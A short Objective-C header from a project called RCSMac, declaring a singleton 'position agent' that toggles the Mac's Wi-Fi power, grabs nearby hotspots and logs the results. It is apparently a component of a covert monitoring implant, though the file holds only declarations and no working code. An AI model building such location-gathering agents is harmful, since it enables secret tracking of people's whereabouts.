//
//  RCSMAgentPosition.h
//  RCSMac
//
//  Created by kiodo on 2/21/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <SystemConfiguration/SystemConfiguration.h>

#import "RCSMLogManager.h"

@interface RCSMAgentPosition : NSObject 
{    
@private
  NSMutableDictionary *mAgentConfiguration;
}

+ (RCSMAgentPosition *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (SCNetworkInterfaceRef)getAirportInterface:(CFStringRef) aNetInterface;
- (BOOL)setAirportPower:(CFStringRef) aNetInterface withMode:(BOOL)power;
- (BOOL)isAirportPowerOn:(CFStringRef)aNetInterface;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mAgentConfiguration;
- (BOOL)grabHotspots;
- (BOOL)stop;
- (void)start;
@end
